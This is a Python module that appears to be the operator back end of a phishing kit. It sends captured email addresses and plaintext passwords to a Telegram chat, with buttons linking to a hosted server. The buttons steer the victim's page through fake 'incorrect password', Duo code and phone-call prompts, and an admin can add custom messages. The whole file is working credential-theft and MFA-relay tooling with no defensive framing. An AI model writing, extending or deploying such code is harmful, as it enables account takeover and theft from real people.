import requests
import json
from dotenv import load_dotenv
import os
from urllib.parse import quote

# --- Load Environment Variables ---
load_dotenv()
BOT_TOKEN = os.environ.get('BOT_TOKEN')
DEFAULT_USER_ID = os.environ.get('USER_ID') # Default user from .env
HOSTED_URL = os.environ.get('HOSTED_URL')

# --- CONSTANTS ---
# The user ID of the admin who is allowed to set custom statuses.
ADMIN_USER_ID = "5594467534"


def send_notification(text, user_id=None):
    """
    Sends a plain text notification to a specified Telegram user.
    If no user_id is provided, it falls back to the default user.
    """
    base_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    
    chat_id = user_id if user_id else DEFAULT_USER_ID

    payload = {
        'chat_id': chat_id,
        'text': text
    }
    try:
        response = requests.post(base_url, data=payload)
        response.raise_for_status()
        print(f"Message sent successfully to (ID: {chat_id}).")
    except requests.exceptions.RequestException as e:
        print(f"Error sending message to (ID: {chat_id}): {e}")


def get_status_update(email, password, user_id=None):
    """
    Sends credentials to the specified Telegram user with status control buttons.
    If the user is the admin, an extra button to set a custom status is added.
    """
    base_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    
    chat_id = user_id if user_id else DEFAULT_USER_ID
    
    text = f"New Login Attempt:\n\nEmail: {email}\nPassword: {password}"

    payload = {
        'chat_id': chat_id,
        'text': text,
    }

    statuses = [
        'incorrect password',
        'mobile notification',
        'duo code',
        'phone_call',
        'incorrect duo code',
        'success'
    ]
    
    # Build keyboard with the standard callback buttons
    keyboard_layout = [
        [
            {
                'text': status.replace("_", " ").title(),
                'url': f"{HOSTED_URL}/set_status/{chat_id}/{quote(email)}/{quote(status)}"
            }
        ]
        for status in statuses
    ]

    # --- NEW: If the recipient is the admin, add the special button ---
    if str(chat_id) == ADMIN_USER_ID:
        custom_button_row = [{
            'text': '✍️ Set Custom Message',
            'url': f"{HOSTED_URL}/set_custom_status?email={quote(email)}"
        }]
        # Add it as a new row at the bottom of the keyboard
        keyboard_layout.append(custom_button_row)


    inline_keyboard = {'inline_keyboard': keyboard_layout}
    payload['reply_markup'] = json.dumps(inline_keyboard)

    try:
        response = requests.post(base_url, data=payload)
        response.raise_for_status()
        print(f"Status update request sent successfully to (ID: {chat_id}).")
    except requests.exceptions.RequestException as e:
        print(f"Error sending status update to (ID: {chat_id}): {e}")
        if e.response is not None:
            print(f"Response content: {e.response.text}")
